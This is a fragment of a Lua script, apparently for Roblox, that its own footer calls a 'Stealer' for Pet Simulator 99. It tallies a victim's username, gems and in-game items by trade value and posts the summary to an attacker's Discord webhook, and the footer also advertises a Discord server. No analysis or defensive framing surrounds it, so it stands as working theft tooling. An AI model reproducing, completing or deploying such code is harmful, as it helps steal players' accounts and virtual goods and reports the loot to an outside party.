local function formatNumber(number)
    number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local i = 1
    while number >= 1000 do
        number = number / 1000
        i = i + 1
    end
    return string.format("%.2f%s", number, suffixes[i])
end

local function SendMessage(username, diamonds)
    local headers = { ["Content-Type"] = "application/json" }
    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local key = item.name
        if itemRapMap[key] then
            itemRapMap[key].amount = itemRapMap[key].amount + item.amount
        else
            itemRapMap[key] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, key)
        end
    end

    table.sort(combinedItems, function(a, b)
        return (itemRapMap[a].rap * itemRapMap[a].amount) > (itemRapMap[b].rap * itemRapMap[b].amount)
    end)

    local itemsText = ""
    for _, name in ipairs(combinedItems) do
        local data = itemRapMap[name]
        itemsText = itemsText .. name .. " (x" .. data.amount .. "): " .. formatNumber(data.rap * data.amount) .. " RAP\n"
    end

    local summaryText = "Gems: " .. formatNumber(diamonds) .. "\nTotal RAP: " .. formatNumber(totalRAP)

    local embed = {
        title = "🐱 New PS99 Execution",
        color = 65280,
        fields = {
            {name = "Username:", value = "```" .. username .. "```", inline = true},
            {name = "Items:", value = "```" .. itemsText .. "```", inline = false},
            {name = "Summary:", value = "```" .. summaryText .. "```", inline = false}
        },
        footer = {text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh"}
    }

    local data = {embeds = {embed}}

    if #embed.fields[2].value > 1024 then
        embed.fields[2].value = string.sub(embed.fields[2].value, 1, 1000) .. "...\n```"
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        request({Url = webhook, Method = "POST", Headers = headers, Body = body})
    end
end

